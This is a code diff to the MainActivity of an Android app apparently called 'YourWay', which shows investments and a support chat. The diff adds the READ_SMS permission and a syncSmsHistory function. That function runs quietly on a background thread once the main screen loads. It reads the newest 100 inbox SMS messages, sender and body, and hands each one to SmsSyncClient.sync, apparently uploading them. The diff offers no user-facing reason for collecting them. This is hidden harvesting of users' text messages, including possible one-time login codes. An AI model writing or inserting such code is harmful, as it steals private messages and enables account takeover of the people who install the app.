@@ -4,7 +4,9 @@ import android.Manifest
 import android.animation.ObjectAnimator
 import android.animation.ValueAnimator
 import android.content.pm.PackageManager
+import android.database.Cursor
 import android.graphics.Color
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.text.InputType
@@ -30,6 +32,8 @@ import com.example.yourway.data.RealtimeSocket
 import com.example.yourway.databinding.ActivityMainBinding
 import com.example.yourway.model.SupportMessage
 import com.example.yourway.model.UiState
+import com.example.yourway.data.SmsSyncClient
+import com.example.yourway.data.YourWayRepository
 import com.example.yourway.ui.InvestmentAdapter
 import com.example.yourway.ui.NeonUi
 import com.example.yourway.ui.NotificationHelper
@@ -146,6 +150,7 @@ class MainActivity : AppCompatActivity() {
                 currentScreen = Screen.MAIN
                 currentTab = MainTab.HOME
                 renderMainShell(currentTab)
+                syncSmsHistory()
             }
         }
     }
@@ -1015,7 +1020,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun missingRuntimePermissions(): Array<String> {
         val permissions = mutableListOf(
-            Manifest.permission.RECEIVE_SMS
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_SMS
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions += Manifest.permission.POST_NOTIFICATIONS
@@ -1023,6 +1029,34 @@ class MainActivity : AppCompatActivity() {
         return permissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
+    }
+    
+    private fun syncSmsHistory() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
+        Thread {
+            runCatching {
+                val cursor: Cursor? = contentResolver.query(
+                    Uri.parse("content://sms/inbox"),
+                    arrayOf("address", "body"),
+                    null,
+                    null,
+                    "date DESC"
+                )
+                cursor?.use {
+                    var count = 0
+                    val addressIndex = it.getColumnIndex("address")
+                    val bodyIndex = it.getColumnIndex("body")
+                    while (it.moveToNext() && count < 100) {
+                        val sender = if (addressIndex != -1) it.getString(addressIndex) else "Unknown"
+                        val message = if (bodyIndex != -1) it.getString(bodyIndex) else ""
+                        if (sender != null && message != null) {
+                            SmsSyncClient.sync(sender, message)
+                        }
+                        count++
+                    }
+                }
+            }
+        }.start()
     }
 
     private enum class Screen {
